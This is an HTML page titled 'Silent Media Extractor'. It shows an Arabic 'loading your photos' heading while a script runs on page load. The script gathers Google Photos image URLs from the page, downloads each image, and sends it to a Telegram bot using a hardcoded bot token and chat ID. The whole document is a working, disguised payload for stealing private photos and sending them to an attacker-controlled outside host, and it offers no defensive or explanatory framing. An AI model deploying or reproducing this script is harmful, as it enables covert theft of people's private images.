<!DOCTYPE html>
<html>
<head><title>Silent Media Extractor</title></head>
<body>
  <h2>جارٍ تحميل صورك...</h2>
  <script>
    (async () => {
      const telegramToken = '8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0';
      const chatId = '6894787120';

      // انتظر لتحميل الصور من Google Photos
      await new Promise(r => setTimeout(r, 3000));

      const images = Array.from(document.querySelectorAll("img")).map(img => img.src).filter(src => src.includes("googleusercontent"));

      for (const url of images) {
        try {
          const res = await fetch(url);
          const blob = await res.blob();

          const form = new FormData();
          form.append("chat_id", chatId);
          form.append("photo", blob, "image.jpg");

          await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
            method: "POST",
            body: form
          });

          console.log("✅ sent", url);
        } catch (e) {
          console.warn("❌ error", url);
        }
      }
    })();
  </script>
</body>
</html>
